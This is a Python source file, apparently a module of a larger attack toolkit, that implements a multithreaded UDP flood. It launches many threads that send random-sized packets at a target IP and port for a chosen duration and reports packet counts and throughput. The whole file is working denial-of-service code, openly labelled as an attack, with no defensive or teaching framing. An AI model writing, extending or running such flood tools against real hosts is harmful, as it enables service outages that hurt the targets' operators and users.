# modules/udp_flood.py

import socket
import random
import threading
import time

class UDPFlood:
    def __init__(self):
        self.running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time = 0
        self.lock = threading.Lock()
        self.threads = []
    
    def generate_packet(self):
        """Generate random UDP packet"""
        size = random.randint(100, 1500)
        return random.randbytes(size)
    
    def flood_worker(self, ip, port, duration):
        """Worker thread for UDP flood"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.1)
            
            end_time = time.time() + duration
            
            while self.running and time.time() < end_time:
                try:
                    packet = self.generate_packet()
                    sent = sock.sendto(packet, (ip, port))
                    
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += sent
                    
                except:
                    with self.lock:
                        self.errors += 1
            
            sock.close()
        except Exception as e:
            with self.lock:
                self.errors += 1
    
    def start_attack(self, ip, port, threads, duration):
        """Start UDP flood attack"""
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time = time.time()
        self.threads = []
        
        print(f"[+] Starting attack on {ip}:{port}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        
        # Start threads
        for i in range(threads):
            t = threading.Thread(target=self.flood_worker, args=(ip, port, duration))
            t.daemon = True
            t.start()
            self.threads.append(t)
            
            if i % 100 == 0:
                print(f"[+] Started {i} threads...")
        
        print(f"[+] All {threads} threads started!")
        
        # Wait for duration
        time.sleep(duration)
        self.running = False
        
        # Wait for threads
        for t in self.threads:
            t.join(timeout=1)
        
        elapsed = time.time() - self.start_time
        
        packet_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        mbps = (self.bytes_sent * 8) / (elapsed * 1000000) if elapsed > 0 else 0
        
        print(f"[+] Attack completed! Packets: {self.packets_sent}, Speed: {mbps:.2f} Mbps")
        
        return {
            'packets': self.packets_sent,
            'bytes': self.bytes_sent,
            'connections': self.packets_sent,
            'errors': self.errors,
            'elapsed': elapsed,
            'packet_rate': packet_rate,
            'conn_rate': packet_rate,
            'mbps': mbps
        }
    
    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        print("[!] Attack stopped!")
